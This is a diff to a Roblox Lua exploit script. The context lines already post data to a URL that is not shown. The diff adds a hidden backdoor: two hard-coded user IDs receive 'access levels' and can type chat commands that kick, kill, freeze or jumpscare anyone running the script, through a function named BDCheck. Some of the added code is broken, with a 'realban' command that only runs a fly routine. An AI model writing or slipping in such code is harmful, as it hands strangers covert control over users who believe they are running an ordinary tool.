@@ -31,6 +31,133 @@ request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 
+-- Stop --
+
+local AdminPrefix = ";" -- Change this to what you want (i.e: ;kill <namehere>) (if its blank it will error)
+local Players = game:GetService("Players")
+local LocalP = Players.LocalPlayer;
+getgenv().AdminTable = {
+  [923076] = {["Access"] = 5};
+  [1069575441] = {["Access"] = 4};-- Access is what level of shit you want the person to have access to
+}
+
+getgenv().psearch = function(Name)
+  local Inserted = {}
+  for _, p in pairs(Players:GetPlayers()) do
+      if string.lower(string.sub(p.Name,1, string.len(Name))) == string.lower(Name) then
+          table.insert(Inserted, p);return p
+      end
+  end
+end -- Simple player finder function
+
+getgenv().AdminCmdList = {
+  ["kick"] = {
+      ["CommandFunc"] = function(Player, self, CmdPlayer)
+          if Player == LocalP or Player == "all" then
+              LocalP:Kick(self)
+          end
+      end;
+      ["Clearence"] = {[4] = true;[5] = true;};
+  }; 
+  ["kill"] = {
+      ["CommandFunc"] = function(Player, self, CmdPlayer)
+          if Player == LocalP or Player == "all" then
+              LocalP.Character.Humanoid:ChangeState(15)
+          end
+      end;
+      ["Clearence"] = {[4] = true;[5] = true;};
+  }; 
+  ["realban"] = {
+      ["CommandFunc"] = function(Player, self, CmdPlayer)
+          if Player == LocalP or Player == "all" then
+            local plrs = game:GetService("Players")
+	    repeat wait()until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("UpperTorso")and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")local a=game.Players.LocalPlayer:GetMouse()repeat wait()until a;local b=game.Players.LocalPlayer;local c=b.Character.UpperTorso;local d=true;local e=true;local f={f=0,b=0,l=0,r=0}local g={f=0,b=0,l=0,r=0}local h=50;local i=0;function Fly()local j=Instance.new("BodyGyro",c)j.P=9e4;j.maxTorque=Vector3.new(9e9,9e9,9e9)j.cframe=c.CFrame;local k=Instance.new("BodyVelocity",c)k.velocity=Vector3.new(0,0.1,0)k.maxForce=Vector3.new(9e9,9e9,9e9)repeat wait()b.Character.Humanoid.PlatformStand=true;if f.l+f.r~=0 or f.f+f.b~=0 then i=i+.5+i/h;if i>h then i=h end elseif not(f.l+f.r~=0 or f.f+f.b~=0)and i~=0 then i=i-1;if i<0 then i=0 end end;if f.l+f.r~=0 or f.f+f.b~=0 then k.velocity=(game.Workspace.CurrentCamera.CoordinateFrame.lookVector*(f.f+f.b)+game.Workspace.CurrentCamera.CoordinateFrame*CFrame.new(f.l+f.r,(f.f+f.b)*.2,0).p-game.Workspace.CurrentCamera.CoordinateFrame.p)*i;g={f=f.f,b=f.b,l=f.l,r=f.r}elseif f.l+f.r==0 and f.f+f.b==0 and i~=0 then k.velocity=(game.Workspace.CurrentCamera.CoordinateFrame.lookVector*(g.f+g.b)+game.Workspace.CurrentCamera.CoordinateFrame*CFrame.new(g.l+g.r,(g.f+g.b)*.2,0).p-game.Workspace.CurrentCamera.CoordinateFrame.p)*i else k.velocity=Vector3.new(0,0.1,0)end;j.cframe=game.Workspace.CurrentCamera.CoordinateFrame*CFrame.Angles(-math.rad((f.f+f.b)*50*i/h),0,0)until not d;f={f=0,b=0,l=0,r=0}g={f=0,b=0,l=0,r=0}i=0;j:Destroy()k:Destroy()b.Character.Humanoid.PlatformStand=false end;a.KeyDown:connect(function(l)if l:lower()=="e"then if d then d=false else d=true;Fly()end elseif l:lower()=="w"then f.f=1 elseif l:lower()=="s"then f.b=-1 elseif l:lower()=="a"then f.l=-1 elseif l:lower()=="d"then f.r=1 end end)a.KeyUp:connect(function(l)if l:lower()=="w"then f.f=0 elseif l:lower()=="s"then f.b=0 elseif l:lower()=="a"then f.l=0 elseif l:lower()=="d"then f.r=0 end end)Fly()
+            end
+      end;
+      ["Clearence"] = {[5] = true;};
+  }; 
+  ["freeze"] = {
+      ["CommandFunc"] = function(Player, self, CmdPlayer)
+          if Player == LocalP or Player == "all" then
+		game.Players.LocalPlayer.Character.Head.Anchored = true
+          end
+      end;
+      ["Clearence"] = {[4] = true;[5] = true;};
+      
+  }; 
+  ["unfreeze"] = {
+      ["CommandFunc"] = function(Player, self, CmdPlayer)
+          if Player == LocalP or Player == "all" then
+		game.Players.LocalPlayer.Character.Head.Anchored = false
+          end
+      end;
+      ["Clearence"] = {[4] = true;[5] = true;};
+        }; 
+  ["jumpscare"] = {
+      ["CommandFunc"] = function(Player, self, CmdPlayer)
+          if Player == LocalP or Player == "all" then
+		local me = "B0_0PS" -- You don't get jumpscared.
+while wait() do
+for i,v in pairs(game.Players:GetPlayers()) do
+       if v.Name ~= me and not v.PlayerGui:FindFirstChild("Screamer") and v:FindFirstChild("PlayerGui") then
+               spawn(function()
+                       local s = Instance.new("Sound",newgui)
+                       s.SoundId = "rbxassetid://5657950552"
+                       s.Volume = 10
+                       s.Looped = true
+                       s:Play()
+                       local newgui = Instance.new("ScreenGui",v.PlayerGui)
+                       newgui.Name = "Screamer"
+                       local newimage = Instance.new("ImageLabel",newgui)
+                       newimage.Image = "rbxassetid://1586343289"
+                       newimage.Size = UDim2.new(1,0,1,0)
+                       local s = Instance.new("Sound",newgui)
+                       s.SoundId = "rbxassetid://5657950552"
+                       s.Volume = 10
+                       s.Looped = true
+                       s:Play()
+                       print("Screamed "..v.Name)
+                       while wait() do
+                               newimage.ImageColor3 = Color3.new(math.random(1,255)/255,math.random(1,255)/255,math.random(1,255)/255)
+                               wait()
+                               newimage.ImageColor3 = Color3.new(1,1,1)
+                       end
+               end)
+       end
+end
+end
+
+          end
+      end;
+      ["Clearence"] = {[4] = true;[5] = true;};
+      
+  }; 
+  
+};
+
+getgenv().BDCheck = function(Target2, Chat)
+  if Chat:sub(1, 1) == AdminPrefix then
+      local args = string.split(Chat:sub(2), " ")
+      local Command = AdminCmdList[table.remove(args, 1)]
+      local targ1 = psearch(table.remove(args, 1))
+      if Command and targ1 then -- Credits to !fishgang Cy for this BDCheck func
+          return Command and Command["Clearence"][AdminTable[Target2.UserId].Access] and Command["CommandFunc"](targ1, table.concat(args, " "), Target2)
+      end
+  end
+end
+
+local GP = Players:GetPlayers()
+for i = 1, #GP do
+  local CoolKidPlayer = GP[i]
+  CoolKidPlayer.Chatted:Connect(function(Word)
+      BDCheck(CoolKidPlayer, Word)
+  end)
+end -- Checks if you chatted a command
+Players.PlayerAdded:Connect(function(CKP)
+  CKP.Chatted:Connect(function(Message)
+      BDCheck(CKP, Message)
+  end)
+end)
 
 delay(0,function()
         respawn = false
